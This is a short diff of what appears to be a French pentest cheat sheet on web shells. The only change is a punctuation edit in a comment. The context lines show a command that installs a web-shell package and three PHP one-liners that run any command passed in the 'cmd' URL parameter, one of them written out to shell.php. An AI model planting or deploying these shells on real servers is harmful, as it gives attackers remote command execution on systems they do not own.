@@ -31,7 +31,7 @@ sudo apt install webshells
 
 ```php
 <?php system($_GET['cmd']); ?>
-<?php echo system($_GET['cmd']); ?>     // avec echo — affiche aussi le retour
+<?php echo system($_GET['cmd']); ?>     // avec echo -  affiche aussi le retour
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
